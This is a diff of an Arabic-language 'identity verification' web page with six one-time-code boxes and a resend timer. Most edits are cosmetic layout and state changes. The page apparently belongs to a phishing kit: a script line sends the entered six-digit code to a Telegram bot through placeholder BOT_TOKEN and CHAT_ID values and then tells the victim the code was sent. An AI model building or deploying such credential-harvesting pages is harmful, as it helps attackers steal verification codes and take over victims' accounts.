@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
+<html lang="ar" dir="rtl"><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>التحقق من الهوية</title>
@@ -90,8 +88,8 @@ html, body {
 .code-inputs input {
   /* responsive width that fits the available space for 6 boxes + gaps */
   width: calc((100% - 60px) / 6); /* 100% minus total gaps (5*12=60px) */
-  max-width: 34px;
-  min-width: 20px;
+  max-width: 28px;
+  min-width: 15px;
   aspect-ratio: 1 / 1; /* keep square */
   border-radius: 8px;
   border: 1px solid #e6e6e8;
@@ -172,7 +170,7 @@ html, body {
   .circle svg { width: 40px; height: 40px; }
 }
 </style>
-</head>
+<style type="text/css" id="operaUserStyle"></style></head>
 <body>
 <div class="wrap">
   <div class="header-top">
@@ -202,11 +200,11 @@ html, body {
         <div class="circle">
           <svg>
             <circle class="bg" cx="24" cy="24" r="18"></circle>
-            <circle class="progress" cx="24" cy="24" r="18"></circle>
+            <circle class="progress" cx="24" cy="24" r="18" style="stroke-dasharray: 113.097; stroke-dashoffset: 113.097;"></circle>
           </svg>
-          <span id="countdown">60</span>
+          <span id="countdown">0</span>
         </div>
-        <div id="resendText">أعد إرسال رمز التأكيد</div>
+        <div id="resendText" class="active">أعد إرسال رمز التأكيد</div>
       </div>
 
       <button id="nextBtn">التالي</button>
@@ -323,5 +321,6 @@ nextBtn.addEventListener('click', ()=>{
   if (code.length===6){ sendToTelegram(code).catch(()=>{}); if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')) return; alert('🚀 تم إرسال رمز التأكيد إلى تلجرام'); }
 });
 </script>
-</body>
-</html>
+
+
+</body></html>
